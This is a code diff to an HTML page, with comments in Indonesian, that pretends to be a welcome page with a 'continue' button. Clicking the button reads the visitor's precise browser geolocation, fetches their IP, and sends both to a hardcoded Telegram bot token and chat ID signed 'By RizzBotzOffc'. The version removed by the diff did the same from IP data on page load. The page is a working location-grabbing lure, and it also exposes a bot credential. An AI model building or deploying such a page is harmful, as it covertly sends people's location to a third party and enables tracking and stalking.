@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website Lokasi Pengunjung</title>
+    <title>Geolocation to Telegram</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap" rel="stylesheet">
     <style>
         body {
@@ -30,58 +30,76 @@
             font-size: 24px;
             color: #333;
         }
+        .button {
+            padding: 12px 25px;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="content">
             <h1>Selamat Datang!</h1>
-            <p>Menunggu data lokasi...</p>
+            <p>Klik tombol di bawah untuk melanjutkan perjalanan anda:</p>
+            <button class="button" id="sendLocation">Countinue</button>
         </div>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        // Mendapatkan IP pengunjung
-        $.get("https://api.ipify.org?format=json", function(data) {
-            const ip = data.ip;
-            console.log("IP Pengunjung: " + ip);
-
-            // Mendapatkan informasi lokasi lebih lengkap berdasarkan IP
-            $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
-                const latitude = locationData.latitude;
-                const longitude = locationData.longitude;
-
-                console.log("Latitude: " + latitude);
-                console.log("Longitude: " + longitude);
-
-                // Kirim data ke Telegram
-                sendToTelegram(ip, latitude, longitude);
-            }).fail(function(error) {
-                console.log("Error mendapatkan data lokasi: ", error);
-            });
-        });
+        // Fungsi untuk mendapatkan lokasi menggunakan HTML5 Geolocation
+        function getGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    console.log("Latitude: " + latitude);
+                    console.log("Longitude: " + longitude);
+                    sendToTelegram(latitude, longitude);
+                }, function(error) {
+                    alert("Geolocation error: " + error.message);
+                });
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
+            }
+        }
 
         // Fungsi untuk mengirim data ke Telegram
-        function sendToTelegram(ip, latitude, longitude) {
-            const telegramBotToken = '7791375028:AAFdGjApp9d47GOH7v9ASKlswwrUXofA2u8'; // Token Bot Telegram Anda
-            const chatId = '5701502998'; // ID Chat Telegram Anda
-            const message = `
+        function sendToTelegram(latitude, longitude) {
+            // Ambil IP pengunjung menggunakan ipify API
+            $.get("https://api.ipify.org?format=json", function(data) {
+                const ip = data.ip;
+                console.log("IP Pengunjung: " + ip);
+
+                // Kirim data ke Telegram
+                const telegramBotToken = '7791375028:AAFdGjApp9d47GOH7v9ASKlswwrUXofA2u8';  // Ganti dengan token bot Telegram Anda
+                const chatId = '5701502998';  // Ganti dengan ID chat Telegram Anda
+                const message = `
 By RizzBotzOffc
 
-IP : ${ip}
-Latitude : ${latitude}
-Longitude : ${longitude}
-            `;
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            // Mengirim data ke Telegram
-            $.get(url, function(response) {
-                console.log("Data berhasil dikirim ke Telegram", response);
-            }).fail(function(error) {
-                console.log("Gagal mengirim data ke Telegram", error);
+IP: ${ip}
+Latitude: ${latitude}
+Longitude: ${longitude}
+                `;
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                // Mengirim data ke Telegram
+                $.get(url, function(response) {
+                    console.log("Data berhasil dikirim ke Telegram");
+                });
             });
         }
+
+        // Event listener untuk tombol "Kirim Lokasi ke Telegram"
+        document.getElementById('sendLocation').addEventListener('click', getGeolocation);
     </script>
 </body>
 </html>
